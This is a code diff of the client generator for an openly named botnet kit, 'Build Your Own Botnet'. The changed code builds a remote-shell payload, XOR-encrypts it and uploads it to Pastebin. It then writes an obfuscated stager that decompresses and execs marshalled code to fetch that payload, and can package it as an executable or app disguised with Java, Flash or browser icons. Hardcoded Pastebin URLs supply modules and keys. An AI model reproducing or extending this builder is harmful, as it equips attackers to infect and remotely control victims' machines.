@@ -80,51 +80,57 @@ def app(options, filename):
 
 def py(options, payload='modules/payload.py', stager='modules/stager.py', **kwargs):
 
+        key = base64.b64encode(os.urandom(16))
+            
+        if options.name:
+            path = options.name
+            if not path.endswith('.py'):
+                path += '.py'
+        else:
+            path    = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', 'byob_%s.py' % util.variable(3))
+
         with open(payload, 'r') as fp:
             payload = fp.read()
-        color = colorama.Fore.RESET
-        name  = 'byob_%s.py' % util.variable(3)
-        path  = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', name)
-        
-        if options.name:
-            name = options.name
-            path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', name)
             
-        if not path.endswith('.py'):
-            path += '.py'
+        with open(stager, 'r') as fp:
+            stager  = fp.read().replace('__KEY__', key)
 
-        if options.repo:
-            payload = payload.replace('$REPO$', options.repo)
-            
-        key  = os.urandom(16)
-        _key = util.pastebin(base64.b64encode(key))
-        payload = payload.replace('$KEY$', _key)
-        code = security.encrypt_xor(payload, key, block_size=8, key_size=16, num_rounds=32, padding='\x00')
-        diff = round(float(100.0 * float(float(len(code))/float(len(payload)) - 1.0)))
+        api     = util.pastebin('\n'.join([options.url, options.api]))
+        payload = payload + "\n\nif __name__ == '__main__':\n    shell = Shell(api='{}')\n    shell.run()".format(api)
+        code    = security.encrypt_xor(payload, base64.b64decode(key), block_size=8, key_size=16, num_rounds=32, padding='\x00')
+        diff    = round(float(100.0 * float(float(len(code))/float(len(payload)) - 1.0)))
+
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Payload encryption complete")
-        print(color + colorama.Style.DIM + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(payload), 'increased' if len(code) > len(payload) else 'reduced', len(code), diff, 'larger' if len(code) > len(payload) else 'smaller').ljust(80 - len("[+] ")))
+        print(colorama.Fore.RESET + colorama.Style.DIM    + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(payload), 'increased' if len(code) > len(payload) else 'reduced', len(code), diff, 'larger' if len(code) > len(payload) else 'smaller').ljust(80 - len("[+] ")))
+
         payload = code
         new_url = util.pastebin(payload)
-        api_key = util.pastebin(security.encrypt_xor(kwargs.get('api_key'), base64.b64decode('uuYGm6cUAIwup6kWybUOZw==')))
-        xor_key = util.pastebin(security.encrypt_xor(key, base64.b64decode('uuYGm6cUAIwup6kWybUOZw==')))
+        kwargs.update({"payload": new_url})
+
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Upload to Pastebin complete")
-        print(color + colorama.Style.DIM + "    ({:,} bytes uploaded to: {}".format(len(payload), new_url).ljust(80 - len("[+] ")))
-        kwargs.update({"payload": new_url, "xor_key": xor_key, "api_key": api_key})
-        with open(stager, 'r') as fp:
-            stager = fp.read() + "\nif __name__ == '__main__':\n    _ = main(config={})".format(json.dumps(kwargs))
-        code = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
-        diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
+        print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes uploaded to: {}".format(len(payload), new_url).ljust(80 - len("[+] ")))
+
+        stager += "\nif __name__ == '__main__':\n    _ = main(payload='{}')".format(new_url)
+        code    = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
+        diff    =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
+
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Stager obfuscation and minification complete")
-        print(color + colorama.Style.DIM + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if len(code) > len(stager) else 'reduced', len(code), diff, 'larger' if len(code) > len(stager) else 'smaller').ljust(80 - len("[+] ")))
-        stager = code
+        print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if len(code) > len(stager) else 'reduced', len(code), diff, 'larger' if len(code) > len(stager) else 'smaller').ljust(80 - len("[+] ")))
+
+        stager  = code
+
         with file(path, 'w') as fp:
             fp.write(stager)
+
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " +  colorama.Fore.RESET + "Client stager generation complete")
-        print(color + colorama.Style.DIM + "    ({:,} bytes written to file: {})".format(len(stager), path).ljust(80 - len("[+] ")))   
+        print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes written to file: {})".format(len(stager), path).ljust(80 - len("[+] ")))   
+
         if options.type == 'exe':
             path = exe(options, path)
+            
         elif options.type == 'app':
             path = app(options, path)
+
         return path
 
     
@@ -132,13 +138,12 @@ def main(*args, **kwargs):
         print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\tClient | Build Your Own Botnet\n")
         parser = argparse.ArgumentParser(prog='client.py', usage='client.py {py,exe,app} host port [options]', description="Client Generator (Build Your Own Botnet)", version='0.4.7')
         parser.add_argument('type', action='store', help='python, executable, app bundle', choices=['py','exe','app'])
-        parser.add_argument('host', action='store', type=str, default='localhost', help='server IP')
-        parser.add_argument('port', action='store', type=int, default=1337, help='server port')
-        parser.add_argument('--repo', action='store', help='base URL for remote imports')
-        parser.add_argument('--name', action='store', help='output filename')
-        parser.add_argument('--icon', action='store', help='java, flash, chrome, firefox, safari')
+        parser.add_argument('--api-url', dest='url', action='store', type=str, help='API endpoint for locating dynamic servers', required=True)
+        parser.add_argument('--api-key', dest='api', action='store', type=str, help='API key to use the API endpoint', required=True)
+        parser.add_argument('--name', dest='name', action='store', help='output filename')
+        parser.add_argument('--icon', dest='icon', action='store',choices=['java', 'flash', 'chrome', 'firefox', 'safari'])
         options = parser.parse_args()
         return py(options, **kwargs)
 
 if __name__ == '__main__':
-    main(**{"modules": "https://pastebin.com/raw/Z5z5cjny","api_key":"https://pastebin.com/raw/QPAJs08x"})
+    main(**{"modules": "https://pastebin.com/raw/Z5z5cjny","api_key":"https://pastebin.com/raw/uYGhnVqp"})
